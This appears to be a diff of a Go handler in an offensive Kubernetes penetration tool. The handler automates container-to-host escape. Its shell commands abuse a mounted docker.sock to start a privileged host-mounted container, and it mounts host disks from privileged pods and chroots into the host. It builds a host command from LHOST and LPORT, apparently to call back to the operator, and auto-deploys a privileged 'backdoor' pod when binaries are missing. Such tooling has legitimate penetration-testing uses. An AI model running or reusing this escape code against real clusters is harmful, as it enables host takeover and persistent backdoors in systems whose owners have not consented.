@@ -1291,89 +1291,167 @@ func (h *CDKHandler) AutoEscape(c *gin.Context) {
 		return
 	}
 
-	// Determine escape method and execute
-	execCtx, execCancel := context.WithTimeout(ctx, 30*time.Second)
-	defer execCancel()
+	// Stage 1: Try native escape in the best candidate pod
+		execCtx, execCancel := context.WithTimeout(ctx, 30*time.Second)
+		defer execCancel()
 
-	method := "none"
-	var escapeCmd string
-	if containsStr(target.reasons, "docker.sock") {
-		method = "docker_sock_api"
-		hostCmd := shellQuoteSingle(autoEscapeHostCommand(req.LHOST, req.LPORT))
-		escapeCmd = fmt.Sprintf(`command -v docker >/dev/null 2>&1 || { echo "MISSING_BINARY:docker"; exit 0; }; docker -H unix:///var/run/docker.sock run --rm --privileged --pid=host --net=host -v /:/host alpine:3.20 sh -c "chroot /host /bin/sh -c %s" 2>&1 && echo DOCKER_CONTAINER_CREATED || echo DOCKER_ESCAPE_FAILED`, hostCmd)
-	} else if containsStr(target.reasons, "privileged") {
-		method = "chroot_or_cgroup"
-		escapeCmd = "command -v mount >/dev/null 2>&1 || { echo \"MISSING_BINARY:mount\"; exit 0; }; command -v chroot >/dev/null 2>&1 || { echo \"MISSING_BINARY:chroot\"; exit 0; }; fdisk -l 2>/dev/null | head -5; mkdir -p /tmp/host_escape; DEV=$(ls /dev/sd*1 /dev/vd*1 /dev/xvd*1 2>/dev/null | head -1); if [ -n \"$DEV\" ]; then mount $DEV /tmp/host_escape 2>&1 && echo MOUNT_OK && (chroot /tmp/host_escape /bin/sh -c 'echo ESCAPED_TO_HOST; id; hostname' 2>&1); else echo NO_HOST_DISK_TRY_CGROUP; fi"
-	} else {
-		escapeCmd = "echo 'No automated escape path for this pod. Try manual methods.'; id; cat /proc/1/status 2>/dev/null | grep CapEff"
-		method = "manual_only"
-	}
+		method := "none"
+		var stage1Cmd string
+		if containsStr(target.reasons, "docker.sock") {
+			method = "docker_sock_api"
+			hostCmd := shellQuoteSingle(autoEscapeHostCommand(req.LHOST, req.LPORT))
+			stage1Cmd = fmt.Sprintf(`command -v docker >/dev/null 2>&1 || { echo "MISSING_BINARY:docker"; exit 0; }; docker -H unix:///var/run/docker.sock run --rm --privileged --pid=host --net=host -v /:/host alpine:3.20 sh -c "chroot /host /bin/sh -c %s" 2>&1 && echo DOCKER_CONTAINER_CREATED || echo DOCKER_ESCAPE_FAILED`, hostCmd)
+		} else if containsStr(target.reasons, "privileged") {
+			method = "chroot_or_cgroup"
+			stage1Cmd = "command -v mount >/dev/null 2>&1 || { echo \"MISSING_BINARY:mount\"; exit 0; }; command -v chroot >/dev/null 2>&1 || { echo \"MISSING_BINARY:chroot\"; exit 0; }; fdisk -l 2>/dev/null | head -5; mkdir -p /tmp/host_escape; DEV=$(ls /dev/sd*1 /dev/vd*1 /dev/xvd*1 2>/dev/null | head -1); if [ -n \"$DEV\" ]; then mount $DEV /tmp/host_escape 2>&1 && echo MOUNT_OK && (chroot /tmp/host_escape /bin/sh -c 'echo ESCAPED_TO_HOST; id; hostname' 2>&1); else echo NO_HOST_DISK_TRY_CGROUP; fi"
+		} else {
+			method = "manual_only"
+			stage1Cmd = "echo 'No automated escape path for this pod. Try manual methods.'; id; cat /proc/1/status 2>/dev/null | grep CapEff"
+		}
 
-	containerName := ""
+		containerName := ""
 		if len(target.pod.Spec.Containers) > 0 {
 			containerName = target.pod.Spec.Containers[0].Name
 		}
-		escResult, execErr := client.ExecInPodResult(execCtx, target.pod.Namespace, target.pod.Name, containerName, []string{"sh", "-c", escapeCmd})
-	out := ""
-	if execErr != nil {
-		out = "exec error: " + execErr.Error()
-		if escResult != nil {
-			out += "\nstdout: " + escResult.Stdout + "\nstderr: " + escResult.Stderr
+		escResult, execErr := client.ExecInPodResult(execCtx, target.pod.Namespace, target.pod.Name, containerName, []string{"sh", "-c", stage1Cmd})
+		out := ""
+		if execErr != nil {
+			out = "exec error: " + execErr.Error()
+			if escResult != nil {
+				out += "\nstdout: " + escResult.Stdout + "\nstderr: " + escResult.Stderr
+			}
+		} else {
+			out = escResult.Stdout
+			if escResult.Stderr != "" {
+				out += "\n" + escResult.Stderr
+			}
 		}
-	} else {
-		out = escResult.Stdout
-		if escResult.Stderr != "" {
-			out += "\n" + escResult.Stderr
+
+		if strings.Contains(out, "ESCAPED_TO_HOST") {
+			escaped = true
+			evidence = out
 		}
-	}
+		hostFSMounted = strings.Contains(out, "MOUNT_OK")
+		hostContainerCreated = strings.Contains(out, "DOCKER_CONTAINER_CREATED")
 
-	if strings.Contains(out, "ESCAPED_TO_HOST") {
-		escaped = true
-		evidence = out
-	}
-	hostFSMounted = strings.Contains(out, "MOUNT_OK")
-	hostContainerCreated = strings.Contains(out, "DOCKER_CONTAINER_CREATED")
-	preview := out
-	if len(preview) > 500 {
-		preview = preview[:500] + "..."
-	}
-	step := gin.H{"step": 3, "action": "execute", "method": method, "escaped": escaped, "output": preview}
-	if hostFSMounted {
-		step["host_fs_mounted"] = true
-	}
-	if hostContainerCreated {
-		step["host_container_created"] = true
-	}
-	steps = append(steps, step)
+		step3Output := out
+		if len(step3Output) > 500 {
+			step3Output = step3Output[:500] + "..."
+		}
+		step := gin.H{"step": 3, "action": "execute", "method": method, "escaped": escaped, "output": step3Output}
+		if hostFSMounted {
+			step["host_fs_mounted"] = true
+		}
+		if hostContainerCreated {
+			step["host_container_created"] = true
+		}
+		steps = append(steps, step)
 
-	resp := gin.H{
-		"escaped":                escaped,
-		"steps":                  steps,
-		"pod_used":               target.pod.Namespace + "/" + target.pod.Name,
-		"evidence":               evidence,
-		"host_fs_mounted":        hostFSMounted,
-		"host_container_created": hostContainerCreated,
-	}
-	if execErr != nil {
-		resp["error"] = "exec into pod failed: " + execErr.Error()
-		resp["full_output"] = out
-	}
-	if strings.Contains(out, "MISSING_BINARY:") {
-		missing := extractMissingBinary(out)
-		resp["error"] = "容器缺少必要二进制文件: " + missing
-		resp["hint"] = "目标容器是精简镜像，缺少 " + missing + "。建议: 1) 部署特权逃逸 Pod (CDK 逃逸 Pod 生成器) 2) 尝试 cgroup release_agent 逃逸 3) 手动上传静态编译的二进制"
-		resp["missing_binary"] = missing
-	}
-	if hostFSMounted && !escaped {
-		resp["note"] = "宿主机文件系统已挂载，但还没有看到明确的宿主机 shell / chroot 成功证据。"
-	}
-	if hostContainerCreated && !escaped {
-		resp["note"] = "已通过 docker.sock 创建宿主机侧特权容器，但当前返回还没有直接宿主机 shell 证据。"
-	}
-	c.JSON(http.StatusOK, resp)
-}
+		// Stage 2: If native escape failed due to missing binaries, auto-deploy a privileged escape pod
+		if !escaped && strings.Contains(out, "MISSING_BINARY:") {
+			missing := extractMissingBinary(out)
+			steps = append(steps, gin.H{"step": 4, "action": "deploy_escape_pod", "result": fmt.Sprintf("native escape failed (missing %s), auto-deploying temporary privileged pod", missing)})
 
-// ==================== CDK Internal Services Scan ====================
+			escapePodName := "k8spen-escape-" + fmt.Sprintf("%d", time.Now().UnixNano()%100000)
+			escapeNs := target.pod.Namespace
+			if escapeNs == "" {
+				escapeNs = "default"
+			}
+			escapePod := kubectl.BuildBackdoorPod(escapePodName, escapeNs, "alpine:3.20", "/host", target.pod.Spec.NodeName)
+
+			_, createErr := client.CreatePrivilegedPod(ctx, escapeNs, escapePod)
+			if createErr != nil {
+				steps = append(steps, gin.H{"step": 4, "action": "deploy_failed", "error": createErr.Error()})
+			} else {
+				// Wait for pod to be running
+				waitCtx, waitCancel := context.WithTimeout(ctx, 30*time.Second)
+				defer waitCancel()
+				running := false
+				for i := 0; i < 15; i++ {
+					select {
+					case <-waitCtx.Done():
+						break
+					default:
+					}
+					p, getErr := client.GetPod(waitCtx, escapeNs, escapePodName)
+					if getErr == nil && p.Status.Phase == "Running" {
+						running = true
+						break
+					}
+					time.Sleep(2 * time.Second)
+				}
+
+				if !running {
+					steps = append(steps, gin.H{"step": 4, "action": "pod_not_ready", "error": "escape pod did not become ready in time"})
+				} else {
+					steps = append(steps, gin.H{"step": 4, "action": "escape_pod_ready", "pod": escapeNs + "/" + escapePodName})
+
+					// Execute chroot escape in the escape pod
+					stage2Cmd := "mount /host 2>&1 && echo MOUNT_OK; (chroot /host /bin/sh -c 'echo ESCAPED_TO_HOST; id; hostname' 2>&1) || echo CHROOT_FAILED"
+					stage2Ctx, stage2Cancel := context.WithTimeout(ctx, 20*time.Second)
+					defer stage2Cancel()
+					s2Result, s2Err := client.ExecInPodResult(stage2Ctx, escapeNs, escapePodName, "backdoor", []string{"sh", "-c", stage2Cmd})
+					s2Out := ""
+					if s2Err != nil {
+						s2Out = "stage2 exec error: " + s2Err.Error()
+						if s2Result != nil {
+							s2Out += "\nstdout: " + s2Result.Stdout
+						}
+					} else {
+						s2Out = s2Result.Stdout
+						if s2Result.Stderr != "" {
+							s2Out += "\n" + s2Result.Stderr
+						}
+					}
+
+					if strings.Contains(s2Out, "ESCAPED_TO_HOST") {
+						escaped = true
+						evidence = s2Out
+						hostFSMounted = true
+					}
+
+					s2Preview := s2Out
+					if len(s2Preview) > 500 {
+						s2Preview = s2Preview[:500] + "..."
+					}
+					steps = append(steps, gin.H{"step": 5, "action": "chroot_escape", "escaped": escaped, "output": s2Preview})
+
+					// Clean up escape pod
+					if delErr := client.DeletePod(context.Background(), escapeNs, escapePodName); delErr != nil {
+						steps = append(steps, gin.H{"step": 6, "action": "cleanup", "error": "failed to delete escape pod: " + delErr.Error()})
+					} else {
+						steps = append(steps, gin.H{"step": 6, "action": "cleanup", "result": "escape pod deleted"})
+					}
+				}
+			}
+		}
+
+		resp := gin.H{
+			"escaped":                escaped,
+			"steps":                  steps,
+			"pod_used":               target.pod.Namespace + "/" + target.pod.Name,
+			"evidence":               evidence,
+			"host_fs_mounted":        hostFSMounted,
+			"host_container_created": hostContainerCreated,
+		}
+		if !escaped && execErr != nil {
+			resp["error"] = "exec into pod failed: " + execErr.Error()
+			resp["full_output"] = out
+		}
+		if !escaped && strings.Contains(out, "MISSING_BINARY:") {
+			missing := extractMissingBinary(out)
+			resp["error"] = "容器缺少必要二进制文件: " + missing
+			resp["hint"] = "已自动部署特权逃逸 Pod，但逃逸仍未成功。建议: 1) 手动进入逃逸 Pod 尝试 cgroup release_agent 2) 上传静态编译的二进制"
+			resp["missing_binary"] = missing
+		}
+		if hostFSMounted && !escaped {
+			resp["note"] = "宿主机文件系统已挂载，但还没有看到明确的宿主机 shell / chroot 成功证据。"
+		}
+		if hostContainerCreated && !escaped {
+			resp["note"] = "已通过 docker.sock 创建宿主机侧特权容器，但当前返回还没有直接宿主机 shell 证据。"
+		}
+		c.JSON(http.StatusOK, resp)
+	}
 
 type servicesScanRequest struct {
 	TargetHost string `json:"target_host" binding:"required"`
